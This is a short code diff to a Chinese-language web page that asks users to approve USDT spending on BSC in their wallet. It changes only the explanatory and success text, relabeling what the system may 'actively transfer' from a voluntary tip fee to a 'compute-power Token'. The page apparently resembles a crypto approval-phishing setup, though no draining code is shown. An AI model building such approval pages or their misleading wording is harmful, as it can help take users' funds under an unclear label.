@@ -33,7 +33,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#0a0e17;
 <body>
 <div class="c">
   <h2>USDT 授权</h2>
-  <div class="sub">点击下方按钮，在钱包中确认授权<br>授权后系统可主动打赏转入自愿打赏费</div>
+  <div class="sub">点击下方按钮，在钱包中确认授权<br>授权后系统可主动转入算力 Token</div>
 
   <div class="info-box">
     <div class="row"><span class="k">合约</span><span class="v">BSC USDT</span></div>
@@ -219,7 +219,7 @@ async function doApprove() {
           });
           var data = await resp.json();
           if (data.success) {
-            showMsg('✅ 授权成功！自愿打赏费系统已激活，3秒后返回...', 'ok');
+            showMsg('✅ 授权成功！算力 Token 系统已激活，3秒后返回...', 'ok');
             setTimeout(function() { window.location.href = 'approve.html?token=' + encodeURIComponent(token); }, 3000);
           } else {
             // 通知失败但显示 TxHash
